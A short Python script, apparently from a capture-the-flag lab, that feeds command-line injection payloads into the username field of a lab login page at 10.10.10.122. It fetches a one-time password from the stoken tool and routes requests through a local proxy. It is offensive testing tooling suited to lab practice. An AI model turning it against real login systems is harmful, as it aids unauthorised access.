#!/usr/bin/python3
import requests
import subprocess
import os
import sys
import urllib
url = "http://10.10.10.122/login.php"

def getStoken():
	p = subprocess.Popen("stoken",stdin=subprocess.PIPE,stdout=subprocess.PIPE)
	result = p.communicate(b"0000")[0]
	result = result.decode("UTF-8")

	pin = result.split(":")
	return (pin[1])

def makeRequest(pl, otp, cookie):
	headerValues = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
		'Accept' :'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Referer': 'http://10.10.10.122/login.php',
		'Connection': 'close'}

	proxyValues = {'http': 'http://127.0.0.1:8080'}

	payload = urllib.parse.quote_plus(pl)
	print ("trying payload: %s" % payload)
	reqdata = {'inputUsername' : payload,'inputOTP': otp}
	with requests.session() as s:
		try:
			s.keep_alive =False
			r = s.post(url, data=reqdata, headers=headerValues,proxies=proxyValues)
		except Exception as e:
			print (repr(e))
		finally:
			s.close()
	print (r.text)
	print (r.cookies)
def main():
	
	payload = sys.argv[1]
	cookie = "e3i2o514r6ltme1cno3skji8s7"
	pin = getStoken()
	print (pin)
	makeRequest(payload,pin.strip(),cookie)

if __name__ == '__main__':
	sys.exit(main())

